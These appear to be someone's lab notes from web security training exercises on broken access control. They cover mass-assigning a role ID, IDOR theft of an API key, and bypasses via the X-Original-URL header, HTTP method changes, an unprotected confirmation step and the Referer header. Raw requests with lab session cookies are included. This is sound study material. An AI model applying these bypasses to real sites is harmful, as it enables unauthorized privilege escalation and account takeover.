# Encounters

# User role can be modified in account. 
## Observations
- Can login 
- Updating email results in the following:
```
{
  "username": "wiener",
  "email": "test@email.com",
  "apikey": "6L3Ug6z68HrWakuMzDxPLXduFMjXIssF",
  "roleid": 1
}
```
- Going to try to supply the additional argument of roleid and see if I can change it. 
```
{"email":"test@email.com",
"roleid":2
}
```
Worked

# User ID controlled by request parameter
- Pretty straight forward idor-style vuln - just change your username to the target carlos to get his API key. 

# User controlled variable with data leakage
- The app appears to check the session id against the user supplied username in the URL when I supplied carlos it provides a 302 back to the login page but DOES load carlo's page on the way to logging me out. 

# URL-based access control can be circumvented
- Param miner finds X-Original-URL is valid. 
- /admin in that value allows access to the admin panel even though we're requesting /. 
- use this to take admin actions. 
- path is provided by the header and parameters provided by the url path in the original request. 
```
GET /?username=carlos HTTP/2
Host: 0ad700f6038befaa81002a42006b00a5.web-security-academy.net
Cookie: session=cfOsf3NOkotltLek2la6zmpzJgt6FCXO
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad700f6038befaa81002a42006b00a5.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Original-Url: /admin/delete
```

# Method based access controls
- Found that you can change the method and run admin commands. Would require prior knowledge or bruteforcing of endpoints and params. 
```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0aa700d504f9a92f80f04e9500e60058.web-security-academy.net
Cookie: session=SAGIgVBqkbRyqpj2wSACu0U4mX5mQf8A
```

# Multi-step promotion process that doesn't have any protection
- Do the process as admin
- Redo the process as a user to see how the access controls fail. 
- The confirmatin parameter bypasses the session validation. 
```
action=upgrade&confirmed=true&username=wiener
```

# Referer-based access control
- Simply having the /admin url in the referer along with the right params allows you to bypass the access controls to upgrade accounts. 

